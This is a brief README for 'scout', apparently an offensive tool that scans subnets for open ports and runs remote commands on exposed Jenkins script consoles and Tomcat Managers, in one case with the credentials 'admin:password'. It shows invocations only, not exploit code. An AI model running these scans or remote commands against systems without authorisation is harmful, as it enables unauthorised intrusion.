# scout

### Scanning

[1.] Scout a subnet for low hanging fruit on port 8080

	$> scout --ip=192.168.0.0/24 --port=8080

[2.] Scout a subnet for various ports -- printing results of each open port

	$> scout --ip=192.168.0.0/24 --port=80,443,8443,8080-8082 --open

	--rate Number of open sockets per scan - default 500
	--timeout Number of miliseconds before deciding port is closed - default 3000
	--logging Enable\Disable logging (results are saved to scout.log) - default true


### Exploitation Examples

[1.] Run a command against a known Jenkins server (that has the script console enabled)

	$> scout --ip=192.168.0.109 --target=jenkins --cmd='whoami'

[2.] Run a command against a discovered Tomcat Manager

	$> scout --ip=192.168.0.110 --target=tomcat --cmd='whoami' --creds='admin:password'
